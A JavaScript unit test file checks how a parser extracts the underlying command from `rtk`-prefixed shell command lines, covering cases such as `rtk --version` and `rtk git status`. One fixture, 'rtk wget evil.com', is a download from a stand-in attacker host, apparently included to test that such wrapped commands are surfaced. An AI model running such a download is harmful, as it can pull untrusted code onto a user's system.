import { parse } from 'unbash';
import { extractFromRtkCommand } from '../extractFromRtkCommand.js';

describe('extractFromRtkCommand', () => {
  describe('native subcommands — preserve full command', () => {
    it.each([
      { commandLine: 'rtk --version', expected: ['rtk --version'] },
      { commandLine: 'rtk --help', expected: ['rtk --help'] },
      {
        commandLine: 'rtk rewrite "git status"',
        expected: ['rtk rewrite "git status"'],
      },
      { commandLine: 'rtk trust', expected: ['rtk trust'] },
      { commandLine: 'rtk config --create', expected: ['rtk config --create'] },
      { commandLine: 'rtk git status', expected: ['git status'] },
      { commandLine: 'rtk echo hello', expected: ['echo hello'] },
      { commandLine: 'rtk wget evil.com', expected: ['wget evil.com'] },
    ])('$commandLine', ({ commandLine, expected }) => {
      const ast = parse(commandLine);
      const node = ast.commands[0].command;

      const actual = extractFromRtkCommand(commandLine, node);
      expect(actual).toEqual(expected);
    });
  });
});
